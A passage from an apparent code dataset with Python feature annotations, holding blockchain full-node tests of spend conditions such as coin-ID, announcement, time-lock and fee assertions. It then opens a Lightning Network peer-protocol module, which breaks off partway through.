seed=b\"reorg since genesis\",\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=spend_bundle,\n        )\n        await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(new_blocks[-1]))\n    @pytest.mark.asyncio\n    async def test_assert_my_coin_id(self, two_nodes):\n        num_blocks = 10\n        wallet_a = WALLET_A\n        coinbase_puzzlehash = WALLET_A_PUZZLE_HASHES[0]\n        receiver_puzzlehash = BURN_PUZZLE_HASH\n        blocks = bt.get_consecutive_blocks(\n            num_blocks, farmer_reward_puzzle_hash=coinbase_puzzlehash, guarantee_transaction_block=True\n        )\n        full_node_api_1, full_node_api_2, server_1, server_2 = two_nodes\n        full_node_1 = full_node_api_1.full_node\n        for block in blocks:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        spend_block = blocks[2]\n        bad_block = blocks[3]\n        spend_coin = None\n        bad_spend_coin = None\n        for coin in list(spend_block.get_included_reward_coins()):\n            if coin.puzzle_hash == coinbase_puzzlehash:\n                spend_coin = coin\n        for coin in list(bad_block.get_included_reward_coins()):\n            if coin.puzzle_hash == coinbase_puzzlehash:\n                bad_spend_coin = coin\n        valid_cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_COIN_ID, [spend_coin.name()])\n        valid_dic = {valid_cvp.opcode: [valid_cvp]}\n        bad_cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_COIN_ID, [bad_spend_coin.name()])\n        bad_dic = {bad_cvp.opcode: [bad_cvp]}\n        bad_spend_bundle = wallet_a.generate_signed_transaction(1000, receiver_puzzlehash, spend_coin, bad_dic)\n        valid_spend_bundle = wallet_a.generate_signed_transaction(1000, receiver_puzzlehash, spend_coin, valid_dic)\n        assert bad_spend_bundle is not None\n        assert valid_spend_bundle is not None\n        invalid_new_blocks = bt.get_consecutive_blocks(\n            1,\n            blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=bad_spend_bundle,\n            guarantee_transaction_block=True,\n        )\n        res, err, _ = await full_node_1.blockchain.receive_block(invalid_new_blocks[-1])\n        assert res == ReceiveBlockResult.INVALID_BLOCK\n        assert err == Err.ASSERT_MY_COIN_ID_FAILED\n        new_blocks = bt.get_consecutive_blocks(\n            1,\n            blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=valid_spend_bundle,\n            guarantee_transaction_block=True,\n        )\n        res, err, _ = await full_node_1.blockchain.receive_block(new_blocks[-1])\n        assert res == ReceiveBlockResult.NEW_PEAK\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_assert_coin_announcement_consumed(self, two_nodes):\n        num_blocks = 10\n        wallet_a = WALLET_A\n        coinbase_puzzlehash = WALLET_A_PUZZLE_HASHES[0]\n        receiver_puzzlehash = BURN_PUZZLE_HASH\n        blocks = bt.get_consecutive_blocks(\n            num_blocks, farmer_reward_puzzle_hash=coinbase_puzzlehash, guarantee_transaction_block=True\n        )\n        full_node_api_1, full_node_api_2, server_1, server_2 = two_nodes\n        full_node_1 = full_node_api_1.full_node\n        for block in blocks:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        block1 = blocks[2]\n        block2 = blocks[3]\n        spend_coin_block_1 = None\n        spend_coin_block_2 = None\n        for coin in list(block1.get_included_reward_coins()):\n            if coin.puzzle_hash == coinbase_puzzlehash:\n                spend_coin_block_1 = coin\n        for coin in list(block2.get_included_reward_coins()):\n            if coin.puzzle_hash == coinbase_puzzlehash:\n                spend_coin_block_2 = coin\n        block1_cvp = ConditionWithArgs(\n            ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT,\n            [Announcement(spend_coin_block_2.name(), b\"test\").name()],\n        )\n        block1_dic = {block1_cvp.opcode: [block1_cvp]}\n        block1_spend_bundle = wallet_a.generate_signed_transaction(\n            1000, receiver_puzzlehash, spend_coin_block_1, block1_dic\n        )\n        block2_cvp = ConditionWithArgs(\n            ConditionOpcode.CREATE_COIN_ANNOUNCEMENT,\n            [b\"test\"],\n        )\n        block2_dic = {block2_cvp.opcode: [block2_cvp]}\n        block2_spend_bundle = wallet_a.generate_signed_transaction(\n            1000, receiver_puzzlehash, spend_coin_block_2, block2_dic\n        )\n        assert block1_spend_bundle is not None\n        invalid_new_blocks = bt.get_consecutive_blocks(\n            1,\n            blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=block1_spend_bundle,\n            guarantee_transaction_block=True,\n        )\n        res, err, _ = await full_node_1.blockchain.receive_block(invalid_new_blocks[-1])\n        assert res == ReceiveBlockResult.INVALID_BLOCK\n        assert err == Err.ASSERT_ANNOUNCE_CONSUMED_FAILED\n        bundle_together = SpendBundle.aggregate([block1_spend_bundle, block2_spend_bundle])\n        new_blocks = bt.get_consecutive_blocks(\n            1,\n            blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=bundle_together,\n            guarantee_transaction_block=True,\n        )\n        res, err, _ = await full_node_1.blockchain.receive_block(new_blocks[-1])\n        assert res == ReceiveBlockResult.NEW_PEAK\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_assert_puzzle_announcement_consumed(self, two_nodes):\n        num_blocks = 10\n        wallet_a = WALLET_A\n        coinbase_puzzlehash = WALLET_A_PUZZLE_HASHES[0]\n        receiver_puzzlehash = BURN_PUZZLE_HASH\n        blocks = bt.get_consecutive_blocks(\n            num_blocks, farmer_reward_puzzle_hash=coinbase_puzzlehash, guarantee_transaction_block=True\n        )\n        full_node_api_1, full_node_api_2, server_1, server_2 = two_nodes\n        full_node_1 = full_node_api_1.full_node\n        for block in blocks:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        block1 = blocks[2]\n        block2 = blocks[3]\n        spend_coin_block_1 = None\n        spend_coin_block_2 = None\n        for coin in list(block1.get_included_reward_coins()):\n            if coin.puzzle_hash == coinbase_puzzlehash:\n                spend_coin_block_1 = coin\n        for coin in list(block2.get_included_reward_coins()):\n            if coin.puzzle_hash == coinbase_puzzlehash:\n                spend_coin_block_2 = coin\n        block1_cvp = ConditionWithArgs(\n            ConditionOpcode.ASSERT_PUZZLE_ANNOUNCEMENT,\n            [Announcement(spend_coin_block_2.puzzle_hash, b\"test\").name()],\n        )\n        block1_dic = {block1_cvp.opcode: [block1_cvp]}\n        block1_spend_bundle = wallet_a.generate_signed_transaction(\n            1000, receiver_puzzlehash, spend_coin_block_1, block1_dic\n        )\n        block2_cvp = ConditionWithArgs(\n            ConditionOpcode.CREATE_PUZZLE_ANNOUNCEMENT,\n            [b\"test\"],\n        )\n        block2_dic = {block2_cvp.opcode: [block2_cvp]}\n        block2_spend_bundle = wallet_a.generate_signed_transaction(\n            1000, receiver_puzzlehash, spend_coin_block_2, block2_dic\n        )\n        assert block1_spend_bundle is not None\n        invalid_new_blocks = bt.get_consecutive_blocks(\n            1,\n            blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=block1_spend_bundle,\n            guarantee_transaction_block=True,\n        )\n        res, err, _ = await full_node_1.blockchain.receive_block(invalid_new_blocks[-1])\n        assert res == ReceiveBlockResult.INVALID_BLOCK\n        assert err == Err.ASSERT_ANNOUNCE_CONSUMED_FAILED\n        bundle_together = SpendBundle.aggregate([block1_spend_bundle, block2_spend_bundle])\n        new_blocks = bt.get_consecutive_blocks(\n            1,\n            blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=bundle_together,\n            guarantee_transaction_block=True,\n        )\n        res, err, _ = await full_node_1.blockchain.receive_block(new_blocks[-1])\n        assert res == ReceiveBlockResult.NEW_PEAK\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_assert_height_absolute(self, two_nodes):\n        num_blocks = 10\n        wallet_a = WALLET_A\n        coinbase_puzzlehash = WALLET_A_PUZZLE_HASHES[0]\n        receiver_puzzlehash = BURN_PUZZLE_HASH\n        blocks = bt.get_consecutive_blocks(\n            num_blocks, farmer_reward_puzzle_hash=coinbase_puzzlehash, guarantee_transaction_block=True\n        )\n        full_node_api_1, full_node_api_2, server_1, server_2 = two_nodes\n        full_node_1 = full_node_api_1.full_node\n        for block in blocks:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        block1 = blocks[2]\n        spend_coin_block_1 = None\n        for coin in list(block1.get_included_reward_coins()):\n            if coin.puzzle_hash == coinbase_puzzlehash:\n                spend_coin_block_1 = coin\n        block1_cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE, [int_to_bytes(10)])\n        block1_dic = {block1_cvp.opcode: [block1_cvp]}\n        block1_spend_bundle = wallet_a.generate_signed_transaction(\n            1000, receiver_puzzlehash, spend_coin_block_1, block1_dic\n        )\n        assert block1_spend_bundle is not None\n        invalid_new_blocks = bt.get_consecutive_blocks(\n            1,\n            blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=block1_spend_bundle,\n            guarantee_transaction_block=True,\n        )\n        res, err, _ = await full_node_1.blockchain.receive_block(invalid_new_blocks[-1])\n        assert res == ReceiveBlockResult.INVALID_BLOCK\n        assert err == Err.ASSERT_HEIGHT_ABSOLUTE_FAILED\n        new_blocks = bt.get_consecutive_blocks(\n            1,\n            blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            guarantee_transaction_block=True,\n        )\n        res, _, _ = await full_node_1.blockchain.receive_block(new_blocks[-1])\n        assert res == ReceiveBlockResult.NEW_PEAK\n        new_blocks = bt.get_consecutive_blocks(\n            1,\n            new_blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=block1_spend_bundle,\n            guarantee_transaction_block=True,\n        )\n        res, err, _ = await full_node_1.blockchain.receive_block(new_blocks[-1])\n        assert err is None\n        assert res == ReceiveBlockResult.NEW_PEAK\n    @pytest.mark.asyncio\n    async def test_assert_height_relative(self, two_nodes):\n        num_blocks = 11\n        wallet_a = WALLET_A\n        coinbase_puzzlehash = WALLET_A_PUZZLE_HASHES[0]\n        receiver_puzzlehash = BURN_PUZZLE_HASH\n        blocks = bt.get_consecutive_blocks(\n            num_blocks, farmer_reward_puzzle_hash=coinbase_puzzlehash, guarantee_transaction_block=True\n        )\n        full_node_api_1, full_node_api_2, server_1, server_2 = two_nodes\n        full_node_1 = full_node_api_1.full_node\n        for block in blocks:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        block1 = blocks[2]\n        spend_coin_block_1 = None\n        for coin in list(block1.get_included_reward_coins()):\n            if coin.puzzle_hash == coinbase_puzzlehash:\n                spend_coin_block_1 = coin\n        block1_cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_RELATIVE, [int_to_bytes(9)])\n        block1_dic = {block1_cvp.opcode: [block1_cvp]}\n        block1_spend_bundle = wallet_a.generate_signed_transaction(\n            1000, receiver_puzzlehash, spend_coin_block_1, block1_dic\n        )\n        assert block1_spend_bundle is not None\n        invalid_new_blocks = bt.get_consecutive_blocks(\n            1,\n            blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=block1_spend_bundle,\n            guarantee_transaction_block=True,\n        )\n        res, err, _ = await full_node_1.blockchain.receive_block(invalid_new_blocks[-1])\n        assert res == ReceiveBlockResult.INVALID_BLOCK\n        assert err == Err.ASSERT_HEIGHT_RELATIVE_FAILED\n        new_blocks = bt.get_consecutive_blocks(\n            1,\n            blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            guarantee_transaction_block=True,\n        )\n        res, _, _ = await full_node_1.blockchain.receive_block(new_blocks[-1])\n        assert res == ReceiveBlockResult.NEW_PEAK\n        new_blocks = bt.get_consecutive_blocks(\n            1,\n            new_blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=block1_spend_bundle,\n            guarantee_transaction_block=True,\n        )\n        res, err, _ = await full_node_1.blockchain.receive_block(new_blocks[-1])\n        assert err is None\n        assert res == ReceiveBlockResult.NEW_PEAK\n    @pytest.mark.asyncio\n    async def test_assert_seconds_relative(self, two_nodes):\n        num_blocks = 10\n        wallet_a = WALLET_A\n        coinbase_puzzlehash = WALLET_A_PUZZLE_HASHES[0]\n        receiver_puzzlehash = BURN_PUZZLE_HASH\n        blocks = bt.get_consecutive_blocks(\n            num_blocks, farmer_reward_puzzle_hash=coinbase_puzzlehash, guarantee_transaction_block=True\n        )\n        full_node_api_1, full_node_api_2, server_1, server_2 = two_nodes\n        full_node_1 = full_node_api_1.full_node\n        for block in blocks:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        block1 = blocks[2]\n        spend_coin_block_1 = None\n        for coin in list(block1.get_included_reward_coins()):\n            if coin.puzzle_hash == coinbase_puzzlehash:\n                spend_coin_block_1 = coin\n        block1_cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_RELATIVE, [int_to_bytes(300)])\n        block1_dic = {block1_cvp.opcode: [block1_cvp]}\n        block1_spend_bundle = wallet_a.generate_signed_transaction(\n            1000, receiver_puzzlehash, spend_coin_block_1, block1_dic\n        )\n        assert block1_spend_bundle is not None\n        invalid_new_blocks = bt.get_consecutive_blocks(\n            1,\n            blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=block1_spend_bundle,\n            time_per_block=20,\n            guarantee_transaction_block=True,\n        )\n        res, err, _ = await full_node_1.blockchain.receive_block(invalid_new_blocks[-1])\n        assert res == ReceiveBlockResult.INVALID_BLOCK\n        assert err == Err.ASSERT_SECONDS_RELATIVE_FAILED\n        valid_new_blocks = bt.get_consecutive_blocks(\n            1,\n            blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=block1_spend_bundle,\n            guarantee_transaction_block=True,\n            time_per_block=301,\n        )\n        res, err, _ = await full_node_1.blockchain.receive_block(valid_new_blocks[-1])\n        assert err is None\n        assert res == ReceiveBlockResult.NEW_PEAK\n    @pytest.mark.asyncio\n    async def test_assert_seconds_absolute(self, two_nodes):\n        num_blocks = 10\n        wallet_a = WALLET_A\n        coinbase_puzzlehash = WALLET_A_PUZZLE_HASHES[0]\n        receiver_puzzlehash = BURN_PUZZLE_HASH\n        blocks = bt.get_consecutive_blocks(\n            num_blocks, farmer_reward_puzzle_hash=coinbase_puzzlehash, guarantee_transaction_block=True\n        )\n        full_node_api_1, full_node_api_2, server_1, server_2 = two_nodes\n        full_node_1 = full_node_api_1.full_node\n        for block in blocks:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        block1 = blocks[2]\n        spend_coin_block_1 = None\n        for coin in list(block1.get_included_reward_coins()):\n            if coin.puzzle_hash == coinbase_puzzlehash:\n                spend_coin_block_1 = coin\n        current_time_plus3 = uint64(blocks[-1].foliage_transaction_block.timestamp + 30)\n        block1_cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_ABSOLUTE, [int_to_bytes(current_time_plus3)])\n        block1_dic = {block1_cvp.opcode: [block1_cvp]}\n        block1_spend_bundle = wallet_a.generate_signed_transaction(\n            1000, receiver_puzzlehash, spend_coin_block_1, block1_dic\n        )\n        assert block1_spend_bundle is not None\n        invalid_new_blocks = bt.get_consecutive_blocks(\n            1,\n            blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=block1_spend_bundle,\n            time_per_block=20,\n            guarantee_transaction_block=True,\n        )\n        res, err, _ = await full_node_1.blockchain.receive_block(invalid_new_blocks[-1])\n        assert res == ReceiveBlockResult.INVALID_BLOCK\n        assert err == Err.ASSERT_SECONDS_ABSOLUTE_FAILED\n        valid_new_blocks = bt.get_consecutive_blocks(\n            1,\n            blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=block1_spend_bundle,\n            guarantee_transaction_block=True,\n            time_per_block=31,\n        )\n        res, err, _ = await full_node_1.blockchain.receive_block(valid_new_blocks[-1])\n        assert err is None\n        assert res == ReceiveBlockResult.NEW_PEAK\n    @pytest.mark.asyncio\n    async def test_assert_fee_condition(self, two_nodes):\n        num_blocks = 10\n        wallet_a = WALLET_A\n        coinbase_puzzlehash = WALLET_A_PUZZLE_HASHES[0]\n        receiver_puzzlehash = BURN_PUZZLE_HASH\n        blocks = bt.get_consecutive_blocks(\n            num_blocks, farmer_reward_puzzle_hash=coinbase_puzzlehash, guarantee_transaction_block=True\n        )\n        full_node_api_1, full_node_api_2, server_1, server_2 = two_nodes\n        full_node_1 = full_node_api_1.full_node\n        for block in blocks:\n            await full_node_api_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        block1 = blocks[2]\n        spend_coin_block_1 = None\n        for coin in list(block1.get_included_reward_coins()):\n            if coin.puzzle_hash == coinbase_puzzlehash:\n                spend_coin_block_1 = coin\n        cvp_fee = ConditionWithArgs(ConditionOpcode.RESERVE_FEE, [int_to_bytes(10)])\n        block1_dic_bad = {cvp_fee.opcode: [cvp_fee]}\n        block1_dic_good = {cvp_fee.opcode: [cvp_fee]}\n        block1_spend_bundle_bad = wallet_a.generate_signed_transaction(\n            1000, receiver_puzzlehash, spend_coin_block_1, block1_dic_bad, fee=9\n        )\n        block1_spend_bundle_good = wallet_a.generate_signed_transaction(\n            1000, receiver_puzzlehash, spend_coin_block_1, block1_dic_good, fee=10\n        )\n        log.warning(block1_spend_bundle_good.additions())\n        log.warning(f\"Spend bundle fees: {block1_spend_bundle_good.fees()}\")\n        invalid_new_blocks = bt.get_consecutive_blocks(\n            1,\n            blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=block1_spend_bundle_bad,\n            guarantee_transaction_block=True,\n        )\n        res, err, _ = await full_node_1.blockchain.receive_block(invalid_new_blocks[-1])\n        assert res == ReceiveBlockResult.INVALID_BLOCK\n        assert err == Err.RESERVE_FEE_CONDITION_FAILED\n        valid_new_blocks = bt.get_consecutive_blocks(\n            1,\n            blocks,\n            farmer_reward_puzzle_hash=coinbase_puzzlehash,\n            transaction_data=block1_spend_bundle_good,\n            guarantee_transaction_block=True,\n        )\n        res, err, _ = await full_node_1.blockchain.receive_block(valid_new_blocks[-1])\n        assert err is None\n        assert res == ReceiveBlockResult.NEW_PEAK",
            "patterns": {
                "pep_526": [
                    [
                        51,
                        "tx: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle)"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        27,
                        29,
                        "async generator",
                        "async def two_nodes(self):\n        async for _ in setup_two_nodes(test_constants):\n            yield _"
                    ],
                    [
                        28,
                        29,
                        "async for",
                        "async for _ in setup_two_nodes(test_constants):\n            yield _"
                    ]
                ],
                "pep_498": [
                    [
                        765,
                        "        log.warning(f\"Spend bundle fees: {block1_spend_bundle_good.fees()}\")"
                    ]
                ]
            }
        },
        "16": {
            "file": "import zlib\nfrom collections import OrderedDict, defaultdict\nimport json\nimport asyncio\nimport os\nimport time\nfrom functools import partial\nfrom typing import List, Tuple, Dict, TYPE_CHECKING, Optional, Callable, Union\nimport traceback\nimport sys\nfrom datetime import datetime\nimport aiorpcx\nfrom .crypto import sha256, sha256d\nfrom . import bitcoin, util\nfrom . import ecc\nfrom .ecc import sig_string_from_r_and_s, get_r_and_s_from_sig_string, der_sig_from_sig_string\nfrom . import constants\nfrom .util import (bh2u, bfh, log_exceptions, ignore_exceptions, chunks, SilentTaskGroup,\n                   UnrelatedTransactionException)\nfrom . import transaction\nfrom .transaction import Transaction, TxOutput, PartialTxOutput, match_script_against_template\nfrom .logging import Logger\nfrom .lnonion import (new_onion_packet, decode_onion_error, OnionFailureCode, calc_hops_data_for_payment,\n                      process_onion_packet, OnionPacket, construct_onion_error, OnionRoutingFailureMessage,\n                      ProcessedOnionPacket, UnsupportedOnionPacketVersion, InvalidOnionMac, InvalidOnionPubkey,\n                      OnionFailureCodeMetaFlag)\nfrom .lnchannel import Channel, RevokeAndAck, htlcsum, RemoteCtnTooFarInFuture, ChannelState, PeerState\nfrom . import lnutil\nfrom .lnutil import (Outpoint, LocalConfig, RECEIVED, UpdateAddHtlc,\n                     RemoteConfig, OnlyPubkeyKeypair, ChannelConstraints, RevocationStore,\n                     funding_output_script, get_per_commitment_secret_from_seed,\n                     secret_to_pubkey, PaymentFailure, LnFeatures,\n                     LOCAL, REMOTE, HTLCOwner, generate_keypair, LnKeyFamily,\n                     ln_compare_features, privkey_to_pubkey, MIN_FINAL_CLTV_EXPIRY_ACCEPTED,\n                     LightningPeerConnectionClosed, HandshakeFailed, NotFoundChanAnnouncementForUpdate,\n                     RemoteMisbehaving,\n                     NBLOCK_OUR_CLTV_EXPIRY_DELTA, format_short_channel_id, ShortChannelID,\n                     IncompatibleLightningFeatures, derive_payment_secret_from_payment_preimage,\n                     LN_MAX_FUNDING_SAT, calc_fees_for_commitment_tx)\nfrom .lnutil import FeeUpdate, channel_id_from_funding_tx\nfrom .lntransport import LNTransport, LNTransportBase\nfrom .lnmsg import encode_msg, decode_msg\nfrom .interface import GracefulDisconnect, NetworkException\nfrom .lnrouter import fee_for_edge_msat\nfrom .lnutil import ln_dummy_address\nfrom .json_db import StoredDict\nif TYPE_CHECKING:\n    from .lnworker import LNWorker, LNGossip, LNWallet, LNBackups\n    from .lnrouter import RouteEdge, LNPaymentRoute\n    from .transaction import PartialTransaction\nLN_P2P_NETWORK_TIMEOUT = 20\nclass Peer(Logger):\n    LOGGING_SHORTCUT = 'P'\n    def __init__(\n            self,\n            lnworker: Union['LNGossip', 'LNWallet', 'LNBackups'],\n            pubkey: bytes,\n            transport: LNTransportBase\n    ):\n        self._sent_init = False  \n        self._received_init = False  \n        self.initialized = asyncio.Future()\n        self.querying = asyncio.Event()\n        self.transport = transport\n        self.pubkey = pubkey  \n        self.lnworker = lnworker\n        self.privkey = self.transport.privkey  \n        self.features = self.lnworker.features\n        self.their_features = 0\n        self.node_ids = [self.pubkey, privkey_to_pubkey(self.privkey)]\n        assert self.node_ids[0] != self.node_ids[1]\n        self.network = lnworker.network\n        self.channel_db = lnworker.network.channel_db\n        self.ping_time = 0\n        self.reply_channel_range = asyncio.Queue()\n        self.gossip_queue = asyncio.Queue()\n        self.ordered_messages = ['accept_channel', 'funding_signed', 'funding_created', 'accept_channel', 'channel_reestablish', 'closing_signed']\n        self.ordered_message_queues = defaultdict(asyncio.Queue) \n        self.temp_id_to_id = {}   \n        self.funding_created_sent = set() \n        self.funding_signed_sent = set()  \n        self.shutdown_received = {} \n        self.announcement_signatures = defaultdict(asyncio.Queue)\n        self.orphan_channel_updates = OrderedDict()\n        Logger.__init__(self)\n        self.taskgroup = SilentTaskGroup()\n    def send_message(self, message_name: str, **kwargs):\n        assert type(message_name) is str\n        self.logger.debug(f\"Sending {message_name.upper()}\")\n        if message_name.upper() != \"INIT\" and not self.is_initialized():\n            raise Exception(\"tried to send message before we are initialized\")\n        raw_msg = encode_msg(message_name, **kwargs)\n        self._store_raw_msg_if_local_update(raw_msg, message_name=message_name, channel_id=kwargs.get(\"channel_id\"))\n        self.transport.send_bytes(raw_msg)\n    def _store_raw_msg_if_local_update(self, raw_msg: bytes, *, message_name: str, channel_id: Optional[bytes]):\n        is_commitment_signed = message_name == \"commitment_signed\"\n        if not (message_name.startswith(\"update_\") or is_commitment_signed):\n            return\n        assert channel_id\n        chan = self.get_channel_by_id(channel_id)\n        if not chan:\n            raise Exception(f\"channel {channel_id.hex()} not found for peer {self.pubkey.hex()}\")\n        chan.hm.store_local_update_raw_msg(raw_msg, is_commitment_signed=is_commitment_signed)\n        if is_commitment_signed:\n            self.lnworker.save_channel(chan)\n    def maybe_set_initialized(self):\n        if self.initialized.done():\n            return\n        if self._sent_init and self._received_init:\n            self.initialized.set_result(True)\n    def is_initialized(self) -> bool:\n        return (self.initialized.done()\n                and not self.initialized.cancelled()\n                and self.initialized.exception() is None\n                and self.initialized.result() is True)\n    async def initialize(self):\n        if isinstance(self.transport, LNTransport):\n            await self.transport.handshake()\n        self.send_message(\"init\", gflen=0, flen=2, features=self.features.for_init_message(),\n                          init_tlvs={\n                              'networks':\n                                  {'chains': constants.net.rev_genesis_bytes()}\n                          })\n        self._sent_init = True\n        self.maybe_set_initialized()\n    @property\n    def channels(self) -> Dict[bytes, Channel]:\n        return self.lnworker.channels_for_peer(self.pubkey)\n    def get_channel_by_id(self, channel_id: bytes) -> Optional[Channel]:\n        chan = self.lnworker.get_channel_by_id(channel_id)\n        if not chan:\n            return None\n        if chan.node_id != self.pubkey:\n            return None\n        return chan\n    def diagnostic_name(self):\n        return self.lnworker.__class__.__name__ + ', ' + self.transport.name()\n    def ping_if_required(self):\n        if time.time() - self.ping_time > 120:\n            self.send_message('ping', num_pong_bytes=4, byteslen=4)\n            self.ping_time = time.time()\n    def process_message(self, message):\n        message_type, payload = decode_msg(message)\n        from .lnworker import LNBackups\n        if isinstance(self.lnworker, LNBackups) and message_type != 'init':\n            return\n        if message_type in self.ordered_messages:\n            chan_id = payload.get('channel_id') or payload[\"temporary_channel_id\"]\n            self.ordered_message_queues[chan_id].put_nowait((message_type, payload))\n        else:\n            if message_type != 'error' and 'channel_id' in payload:\n                chan = self.get_channel_by_id(payload['channel_id'])\n                if chan is None:\n                    raise Exception('Got unknown '+ message_type)\n                args = (chan, payload)\n            else:\n                args = (payload,)\n            try:\n                f = getattr(self, 'on_' + message_type)\n            except AttributeError:\n                return\n            if message_type in ['node_announcement', 'channel_announcement', 'channel_update']:\n                payload['raw'] = message\n            execution_result = f(*args)\n            if asyncio.iscoroutinefunction(f):\n                asyncio.ensure_future(execution_result)\n    def on_error(self, payload):\n        self.logger.info(f\"remote peer sent error [DO NOT TRUST THIS MESSAGE]: {payload['data'].decode('ascii')}\")\n        chan_id = payload.get(\"channel_id\")\n        if chan_id in self.temp_id_to_id:\n            chan_id = self.temp_id_to_id[chan_id]\n        self.ordered_message_queues[chan_id].put_nowait((None, {'error':payload['data']}))\n    def on_ping(self, payload):\n        l = payload['num_pong_bytes']\n        self.send_message('pong', byteslen=l)\n    def on_pong(self, payload):\n        pass\n    async def wait_for_message(self, expected_name, channel_id):\n        q = self.ordered_message_queues[channel_id]\n        name, payload = await asyncio.wait_for(q.get(), LN_P2P_NETWORK_TIMEOUT)\n        if payload.get('error'):\n            raise Exception('Remote peer reported error [DO NOT TRUST THIS MESSAGE]: ' + repr(payload.get('error')))\n        if name != expected_name:\n            raise Exception(f\"Received unexpected '{name}'\")\n        return payload\n    def on_init(self, payload):\n        if self._received_init:\n            self.logger.info(\"ALREADY INITIALIZED BUT RECEIVED INIT\")\n            return\n        self.their_features = LnFeatures(int.from_bytes(payload['features'], byteorder=\"big\"))\n        their_globalfeatures = int.from_bytes(payload['globalfeatures'], byteorder=\"big\")\n        self.their_features |= their_globalfeatures\n        if not self.their_features.validate_transitive_dependencies():\n            raise GracefulDisconnect(\"remote did not set all dependencies for the features they sent\")\n        try:\n            self.features = ln_compare_features(self.features, self.their_features)\n        except IncompatibleLightningFeatures as e:\n            self.initialized.set_exception(e)\n            raise GracefulDisconnect(f\"{str(e)}\")\n        their_networks = payload[\"init_tlvs\"].get(\"networks\")\n        if their_networks:\n            their_chains = list(chunks(their_networks[\"chains\"], 32))\n            if constants.net.rev_genesis_bytes() not in their_chains:\n                raise GracefulDisconnect(f\"no common chain found with remote. (they sent: {their_chains})\")\n        self.lnworker.on_peer_successfully_established(self)\n        self._received_init = True\n        self.maybe_set_initialized()\n    def on_node_announcement(self, payload):\n        self.gossip_queue.put_nowait(('node_announcement', payload))\n    def on_channel_announcement(self, payload):\n        self.gossip_queue.put_nowait(('channel_announcement', payload))\n    def on_channel_update(self, payload):\n        self.maybe_save_remote_update(payload)\n        self.gossip_queue.put_nowait(('channel_update', payload))\n    def maybe_save_remote_update(self, payload):\n        for chan in self.channels.values():\n            if chan.short_channel_id == payload['short_channel_id']:\n                chan.set_remote_update(payload['raw'])\n                self.logger.info(\"saved remote_update\")\n    def on_announcement_signatures(self, chan: Channel, payload):\n        if chan.config[LOCAL].was_announced:\n            h, local_node_sig, local_bitcoin_sig = self.send_announcement_signatures(chan)\n        else:\n            self.announcement_signatures[chan.channel_id].put_nowait(payload)\n    def handle_disconnect(func):\n        async def wrapper_func(self, *args, **kwargs):\n            try:\n                return await func(self, *args, **kwargs)\n            except GracefulDisconnect as e:\n                self.logger.log(e.log_level, f\"Disconnecting: {repr(e)}\")\n            except (LightningPeerConnectionClosed, IncompatibleLightningFeatures,\n                    aiorpcx.socks.SOCKSError) as e:\n                self.logger.info(f\"Disconnecting: {repr(e)}\")\n            finally:\n                self.close_and_cleanup()\n        return wrapper_func\n    @ignore_exceptions  \n    @log_exceptions\n    @handle_disconnect\n    async def main_loop(self):\n        async with self.taskgroup as group:\n            await group.spawn(self._message_loop())\n            await group.spawn(self.htlc_switch())\n            await group.spawn(self.query_gossip())\n            await group.spawn(self.process_gossip())\n    async def process_gossip(self):\n        await self.channel_db.data_loaded.wait()\n        while True:\n            await asyncio.sleep(5)\n            chan_anns = []\n            chan_upds = []\n            node_anns = []\n            while True:\n                name, payload = await self.gossip_queue.get()\n                if name == 'channel_announcement':\n                    chan_anns.append(payload)\n                elif name == 'channel_update':\n                    chan_upds.append(payload)\n                elif name == 'node_announcement':\n                    node_anns.append(payload)\n                else:\n                    raise Exception('unknown message')\n                if self.gossip_queue.empty():\n                    break\n            self.logger.debug(f'process_gossip {len(chan_anns)} {len(node_anns)} {len(chan_upds)}')\n            for chan_anns_chunk in chunks(chan_anns, 300):\n                self.verify_channel_announcements(chan_anns_chunk)\n                